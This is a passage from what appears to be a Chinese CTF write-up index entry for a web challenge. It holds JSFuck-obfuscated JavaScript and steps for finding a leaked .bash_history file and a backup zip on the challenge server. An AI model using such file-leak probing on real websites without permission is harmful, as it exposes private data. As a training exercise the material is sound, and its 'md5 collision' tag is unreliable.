+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]]+(![]+[])[!![]+!![]+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+([]+[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+({}+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+({}[[]]+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]])())[!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]])()(({}+[])[+[]])[+[]]+(!![]+!![]+[])+(!![]+[])[!![]+!![]+!![]])+([]+[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+({}+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+({}[[]]+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]])())[!![]+!![]+!![]]+([]+[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+({}+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+({}[[]]+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]])())[+[]]+([]+[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+({}+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+({}[[]]+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]])())[!![]+!![]+!![]]+[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+({}[[]]+[])[+[]]+({}[[]]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(![]+[])[!![]+!![]+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+([]+[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+({}+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+({}[[]]+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]])())[!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]])()([][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]]+(![]+[])[!![]+!![]+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+([]+[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+({}+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+({}[[]]+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]])())[!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]])()(({}+[])[+[]])[+[]]+(!![]+!![]+[])+(!![]+!![]+[]))+[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+({}[[]]+[])[+[]]+({}[[]]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(![]+[])[!![]+!![]+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+([]+[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+({}+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+({}[[]]+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]])())[!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]])()([][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]]+(![]+[])[!![]+!![]+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+([]+[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+({}+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+({}[[]]+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]])())[!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]])()(({}+[])[+[]])[+[]]+(!![]+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])))()\n\n\n\n\n解答思路\n\n\n\n\njavascript代码格式为\njsfuck编码\n\n\n运行代码得到\n1bc29b36f623ba82aaf6724fd3b16718.php\n，这时候会想到解码这个字符串，可能为16进制转换，也可能为md5加密，但这题在这里只是个陷阱\n\n\n\"在我脑袋里\"的提示解密有点无厘头，这里的貌似只能靠联想\n\n\nhistory of bash 需要想到.bash_history文件名\n\n\n\n\n解题步骤\n\n\n\n\n在chrome console中运行上述代码，得到结果：\n\n\n\n\n1bc29b36f623ba82aaf6724fd3b16718.php\n\n\n\n\n访问上述网址，得到结果：\n\n\n\n\n\n\n哈哈哈哈哈哈你上当啦，这里什么都没有，TIP在我脑袋里\n\n\n\n\n\n\n根据\"在我脑袋里\"的提示，查看response中的header标签，看到一项非正常的返回头\n\n\n\n\ntip: history of bash\n\n\n\n\n根据提示，访问.bash_history：\n\n\n\n\nhttp://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history\n\n\n得到结果：\n\n\nshell\n   zip -r flagbak.zip ./*\n\n\n\n\n根据提示，访问：\n\n\n\n\nhttp://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip\n\n\n下载解压flagbak.zip后得到flag\n\n\n漏洞挖掘思路\n\n\n\n\ntodo\n\n\n\n\n自动化解析\n\n\n\n\n\n\nTODO\n\n\n\n\n\n\n判断题目特征：\nweb\n \nphp\n \nmd5 collision\n\n\n\n\n设定题目难度等级\nlevel\n为simple\n\n\n提交相应符合要求的字符串", 
            "title": "综合"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_zonghe/#_1", 
            "text": "", 
            "title": "综合"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_zonghe/#_2", 
            "text": "http://ctf.nuptzj.cn/challenges#%E7%BB%BC%E5%90%88%E9%A2%98  javascript\n[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]](({}[[]]+[])[!![]+!![]]+({}+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+({}[[]]+[])[+[]]+[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+({}[[]]+[])[+[]]+({}[[]]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(![]+[])[!![]+!![]+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+([]+[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+({}+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+({}[[]]+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]])())[!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]])()([][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]]+(![]+[])[!![]+!![]+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+([]+[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+({}+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+({}[[]]+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]])())[!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]])()(({}+[])[+[]])[+[]]+(!![]+!![]+!![]+!![]+!![]+!![]+[])+({}[[]]+[])[!![]+!![]])+(!![]+[])[!![]+!![]+!![]]+({}[[]]+[])[+!![]]+(!![]+[])[+[]]+[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+({}[[]]+[])[+[]]+({}[[]]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(![]+[])[!![]+!![]+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+([]+[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+({}+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+({}[[]]+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]])())[!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]])()([][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]]+(![]+[])[!![]+!![]+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+([]+[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+({}+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+({}[[]]+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]])())[!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]])()(({}+[])[+[]])[+[]]+(!![]+!![]+[])+(!![]+[])[!![]+!![]+!![]])+[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+({}[[]]+[])[+[]]+({}[[]]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(![]+[])[!![]+!![]+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+([]+[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+({}+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+({}[[]]+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]])())[!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]])()([][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]]+(![]+[])[!![]+!![]+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+([]+[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+({}+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+({}[[]]+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]])())[!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]])()(({}+[])[+[]])[+[]]+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]))+(!![]+[])[+!![]]+({}[[]]+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+({}[[]]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+({}[[]]+[])[+[]]+({}[[]]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(![]+[])[!![]+!![]+!![]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+([]+[][(![]+[])[!![]+!![]+!![]]+({}+[])[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][({}+[])[!![]+!![]+!![]+!![]+!![]]+({}+[])[+!![]]+({}[[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+({}[[]]+[])[+[]]+({}+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+({}+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]